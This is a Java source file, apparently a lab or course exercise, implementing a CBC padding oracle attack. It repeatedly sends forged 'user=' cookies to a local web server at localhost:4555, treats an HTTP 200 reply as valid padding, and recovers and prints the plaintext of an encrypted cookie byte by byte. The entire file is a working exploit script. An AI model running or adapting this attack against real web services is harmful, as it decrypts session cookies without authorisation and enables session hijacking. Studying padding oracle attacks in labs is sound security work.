import javax.xml.bind.DatatypeConverter;
import java.io.IOException;
import java.math.BigInteger;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;

public class Decrypt {

    public static void main(String[] args) throws IOException, InterruptedException {
        String cookie = args[0];
        URL url = new URL("http://localhost:4555/");


        byte[] valueDecoded = DatatypeConverter.parseBase64Binary(cookie);
        String hexStringDecoded = DatatypeConverter.printHexBinary(valueDecoded);
        //System.err.println(hexStringDecoded);

        int numBlocks = hexStringDecoded.length() / 32;
        String P2hexString = "";

        for (int a = 0; a < numBlocks - 1; a++) {
            String IV = hexStringDecoded.substring(a * 32, (a + 1) * 32);
            String C2 = hexStringDecoded.substring((a + 1) * 32, (a + 2) * 32);
            //System.err.println(C2);

            int C1p[] = new int[16];    // C1 that we chose
            int C1[] = new int[16];     // cyphertext
            int I2[] = new int[16];     // intermediary
            int P2[] = new int[16];     // plaintext
            int P2p[] = new int[16];    // padding

            // First find the last byte
            for (int i = 0; i < 256; i++) {
                C1p[15] = i;
                String hexIV = String.format("%030X", 0).concat(String.format("%02X", C1p[15]));
                String cookieAttempt = hexIV.concat(C2);
                //System.err.println("Block " + (a + 1) + " cookieAttempt: " + cookieAttempt);

                byte[] substringDecoded = DatatypeConverter.parseHexBinary(cookieAttempt);
                String substringEncoded = DatatypeConverter.printBase64Binary(substringDecoded);

                URLConnection uc = url.openConnection();
                uc.setConnectTimeout(1000);
                uc.setReadTimeout(1000);

                uc.setRequestProperty("Cookie", "user=" + substringEncoded);
                //uc.connect();

                String server = uc.getHeaderField(0);   // Get response header
                //System.err.println(server.toString());  // Output the response
		        if(server == null) {
                        i--;
                        System.out.println("TIMEOUT");
                        Thread.sleep(20);
		        }
                else if (server.contains("200")) {
                    I2[15] = C1p[15] ^ 1;   // We know the last byte of padding will be 1
                    C1[15] = Integer.parseInt(IV.substring(30, 32), 16);
                    P2[15] = C1[15] ^ I2[15];
                    break;
                }
            }

            // Now iterate backwards over the rest
            for (int i = 2; i <= 16; i++) {
                P2p[15] = i;
                // Create proper padding that can be accepted
                for (int j = 14; j >= 16 - i; j--) {
                    P2p[j] = 15 - j;
                }
                // Set IV up to this iteration according to padding, we will set this one (C1p[i]) in the loop
                for (int j = 15; j >= 16 - i + 1; j--) {
                    C1p[j] = P2p[j] ^ I2[j];
                }

                // Create cookie attempt, including setting up this iteration for C1p
                for (int j = 0; j < 256; j++) {
                    C1p[16 - i] = j;
                    String C1pString = String.format("%0" + (34 - (i * 2)) + "X", C1p[16 - i]);
                    for (int k = 1; k < i; k++) {
                        C1pString = C1pString.concat(String.format("%02X", C1p[16 - i + k]));
                    }
                    String cookieAttempt = C1pString.concat(C2);
                    //System.err.println("Block " + (a + 1) + " cookieAttempt: " + cookieAttempt);

                    byte[] substringDecoded = DatatypeConverter.parseHexBinary(cookieAttempt);
                    String substringEncoded = DatatypeConverter.printBase64Binary(substringDecoded);

                    URLConnection uc = url.openConnection();
                    uc.setConnectTimeout(1000);
                    uc.setReadTimeout(1000);
                    uc.setRequestProperty("Cookie", "user=" + substringEncoded);
                    //uc.connect();


                    String server = uc.getHeaderField(0);   // Get response header
                    //System.out.println(server.toString());  // Output the response
                    if(server == null) {
                        j--;
                        System.out.println("TIMEOUT");
                        Thread.sleep(20);
                    }
                    else if (server.contains("200")) {
                        I2[16 - i] = C1p[16 - i] ^ P2p[16 - i];
                        C1[16 - i] = Integer.parseInt(IV.substring(32 - (i * 2), 34 - (i * 2)), 16);
                        P2[16 - i] = C1[16 - i] ^ I2[16 - i];
                        break;
                    }
                }
            }
            for (int i = 0; i < 16; i++) {
                P2hexString = P2hexString.concat(String.format("%02X", P2[i]));
            }
        }
	
	    // Strip padding
        Integer paddingNum = Integer.parseInt(P2hexString.substring(P2hexString.length()-2), 16);
        P2hexString = P2hexString.substring(0, P2hexString.length() - 2*paddingNum );

        StringBuilder output = new StringBuilder();
        for (int i = 0; i < P2hexString.length(); i += 2) {
            String str = P2hexString.substring(i, i + 2);
            output.append((char) Integer.parseInt(str, 16));
        }
        System.out.println(output);

    }
}
